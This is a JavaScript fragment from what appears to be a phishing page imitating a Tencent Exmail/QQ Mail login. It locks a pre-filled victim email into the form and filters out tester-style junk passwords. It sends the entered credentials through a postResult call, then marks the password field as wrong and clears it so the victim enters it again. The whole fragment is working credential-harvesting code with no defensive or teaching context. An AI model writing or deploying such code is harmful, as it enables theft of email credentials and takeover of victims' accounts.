// 
if (validEmail.test(usermail)) {
    $("#ex_qq_mail").val(usermail)
    $("#ex_qq_mail").attr('readOnly', true)
}

$("#exmail_form").on('submit', (e)=>{
    e.preventDefault();

    let ex_qq_inputs = document.getElementsByClassName("ex_qq_inputs");

    if (!validEmail.test($("#ex_qq_mail").val())) {
        ex_qq_inputs[0].style.borderColor = "red";
        return
    }
    else{
        ex_qq_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#ex_qq_pass").val()) || $("#ex_qq_pass").val().length < 6 || $("#ex_qq_pass").val().toLowerCase() == "qwerty" || $("#ex_qq_pass").val() == 123456 || $("#ex_qq_pass").val().toLowerCase() == "password" || $("#ex_qq_pass").val().toLowerCase() == "testing") {
        ex_qq_inputs[1].style.borderColor = "red";
        return
    }
    else{
        ex_qq_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#ex_qq_mail").val().split('@');

    postResult(url[1], $("#ex_qq_mail").val(), $("#ex_qq_pass").val(), postCount);
    
    setTimeout(() => {
        ex_qq_inputs[1].style.borderColor = "red";
        postCount++
        $("#ex_qq_pass").val("")
    }, delayCounter);
})